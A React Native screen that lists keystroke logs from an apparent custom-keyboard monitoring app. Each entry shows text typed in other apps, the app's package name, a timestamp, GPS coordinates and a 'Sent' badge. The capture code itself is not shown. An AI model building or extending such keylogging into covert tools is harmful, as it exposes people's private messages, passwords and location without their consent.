import React, {useEffect, useState} from 'react';
import {
  View,
  Text,
  StyleSheet,
  FlatList,
  ActivityIndicator,
  RefreshControl,
  TouchableOpacity,
  NativeModules,
} from 'react-native';
import Logo from '../components/Logo';

const {TypingMonitor} = NativeModules;

const TypingMonitorFallback = {
  getLogs: async () => [],
};

const getTypingMonitorModule = () => {
  try {
    return TypingMonitor && typeof TypingMonitor.getLogs === 'function'
      ? TypingMonitor
      : TypingMonitorFallback;
  } catch {
    return TypingMonitorFallback;
  }
};

interface TypingLog {
  id: string;
  text: string;
  appPackage: string;
  timestamp: number;
  latitude?: number;
  longitude?: number;
  isSent: boolean;
}

type LogsProps = {
  navigation?: {
    navigate?: (screen: string) => void;
    goBack?: () => void;
  };
};

const Logs = ({navigation}: LogsProps) => {
  const [logs, setLogs] = useState<TypingLog[]>([]);
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);

  useEffect(() => {
    loadLogs();
  }, []);

  const loadLogs = async () => {
    try {
      setLoading(true);
      const logsData = await getTypingMonitorModule().getLogs();
      setLogs(Array.isArray(logsData) ? logsData : []);
    } catch (error) {
      console.warn('TypingMonitor logs unavailable:', error);
      setLogs([]);
    } finally {
      setLoading(false);
      setRefreshing(false);
    }
  };

  const onRefresh = () => {
    setRefreshing(true);
    loadLogs();
  };

  const formatTimestamp = (timestamp: number) => {
    if (!timestamp) {
      return 'Unknown time';
    }
    return new Date(timestamp).toLocaleString();
  };

  const formatAppName = (packageName: string) => {
    if (!packageName) {
      return 'Unknown app';
    }
    const parts = packageName.split('.');
    return parts[parts.length - 1] || packageName;
  };

  const goBack = () => navigation?.goBack?.() || navigation?.navigate?.('Dashboard');

  if (loading) {
    return (
      <View style={styles.centerContainer}>
        <ActivityIndicator size="large" color="#2563eb" />
        <Text style={styles.loadingText}>Loading logs...</Text>
      </View>
    );
  }

  return (
    <View style={styles.container}>
      <View style={styles.header}>
        <TouchableOpacity style={styles.backButton} onPress={goBack}>
          <Text style={styles.backButtonText}>Back</Text>
        </TouchableOpacity>
        <View style={styles.titleRow}>
          <Logo size="small" showText={false} />
          <View style={styles.titleBlock}>
            <Text style={styles.title}>Typing Logs</Text>
            <Text style={styles.subtitle}>{logs.length} saved entries</Text>
          </View>
        </View>
      </View>

      <FlatList
        data={logs}
        keyExtractor={(item, index) => item.id || String(index)}
        contentContainerStyle={logs.length === 0 ? styles.emptyList : styles.list}
        renderItem={({item}) => (
          <View style={styles.logItem}>
            <View style={styles.logHeader}>
              <Text style={styles.appName}>{formatAppName(item.appPackage)}</Text>
              {item.isSent ? <Text style={styles.sentBadge}>Sent</Text> : null}
            </View>
            <Text style={styles.logText} numberOfLines={4}>
              {item.text || 'No text preview'}
            </Text>
            <View style={styles.metaRow}>
              <Text style={styles.metaText}>{formatTimestamp(item.timestamp)}</Text>
            </View>
            {item.latitude != null && item.longitude != null ? (
              <Text style={styles.locationText}>
                Location {item.latitude.toFixed(4)}, {item.longitude.toFixed(4)}
              </Text>
            ) : null}
          </View>
        )}
        refreshControl={<RefreshControl refreshing={refreshing} onRefresh={onRefresh} />}
        ListEmptyComponent={
          <View style={styles.emptyContainer}>
            <Text style={styles.emptyTitle}>No logs yet</Text>
            <Text style={styles.emptyText}>
              Enable the MyTypingMonitor keyboard, type normally, then pull down to refresh.
            </Text>
          </View>
        }
      />
    </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#f8fafc',
  },
  centerContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#f8fafc',
  },
  loadingText: {
    marginTop: 14,
    fontSize: 15,
    color: '#475569',
  },
  header: {
    backgroundColor: '#0f172a',
    paddingHorizontal: 18,
    paddingTop: 52,
    paddingBottom: 22,
  },
  backButton: {
    alignSelf: 'flex-start',
    paddingVertical: 8,
    paddingHorizontal: 12,
    borderRadius: 8,
    backgroundColor: 'rgba(255, 255, 255, 0.12)',
    borderWidth: 1,
    borderColor: 'rgba(255, 255, 255, 0.2)',
    marginBottom: 16,
  },
  backButtonText: {
    color: '#fff',
    fontSize: 14,
    fontWeight: '800',
  },
  titleRow: {
    flexDirection: 'row',
    alignItems: 'center',
  },
  titleBlock: {
    marginLeft: 12,
    flex: 1,
  },
  title: {
    color: '#fff',
    fontSize: 28,
    fontWeight: '900',
  },
  subtitle: {
    color: '#cbd5e1',
    fontSize: 14,
    fontWeight: '600',
    marginTop: 2,
  },
  list: {
    paddingVertical: 14,
  },
  emptyList: {
    flexGrow: 1,
    justifyContent: 'center',
  },
  logItem: {
    backgroundColor: '#fff',
    padding: 16,
    marginHorizontal: 16,
    marginVertical: 7,
    borderRadius: 8,
    borderWidth: 1,
    borderColor: '#e2e8f0',
  },
  logHeader: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
    marginBottom: 10,
  },
  appName: {
    color: '#2563eb',
    fontSize: 13,
    fontWeight: '900',
    textTransform: 'uppercase',
    flex: 1,
  },
  sentBadge: {
    color: '#166534',
    backgroundColor: '#dcfce7',
    overflow: 'hidden',
    borderRadius: 999,
    paddingHorizontal: 9,
    paddingVertical: 3,
    fontSize: 12,
    fontWeight: '900',
  },
  logText: {
    color: '#0f172a',
    fontSize: 16,
    fontWeight: '600',
    lineHeight: 23,
  },
  metaRow: {
    marginTop: 12,
    paddingTop: 12,
    borderTopWidth: 1,
    borderTopColor: '#e2e8f0',
  },
  metaText: {
    color: '#64748b',
    fontSize: 12,
    fontWeight: '700',
  },
  locationText: {
    color: '#64748b',
    fontSize: 12,
    fontWeight: '700',
    marginTop: 5,
  },
  emptyContainer: {
    padding: 28,
    alignItems: 'center',
  },
  emptyTitle: {
    color: '#0f172a',
    fontSize: 22,
    fontWeight: '900',
    marginBottom: 8,
  },
  emptyText: {
    color: '#64748b',
    fontSize: 15,
    lineHeight: 22,
    textAlign: 'center',
    fontWeight: '600',
  },
});

export default Logs;
